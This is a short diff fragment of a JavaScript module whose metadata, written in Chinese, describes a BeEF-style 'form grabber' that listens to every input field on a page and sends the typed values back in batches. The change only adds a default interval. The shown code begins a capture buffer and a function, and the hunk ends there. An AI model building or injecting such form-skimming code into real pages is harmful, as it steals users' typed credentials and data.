@@ -1,4 +1,4 @@
-// MODULE = {"desc": "表单实时监听:页面所有 input 输入即时批量回传(BeEF Form Graber)", "category": "信息收集", "params": [["interval", "批量回传间隔ms,默认 8000"]]}
+// MODULE = {"desc": "表单实时监听:页面所有 input 输入即时批量回传(BeEF Form Graber)", "category": "信息收集", "params": [["interval", "批量回传间隔ms,默认 8000", "8000"]]}
 (function () {
   var buf = [];
   function capture(el) {
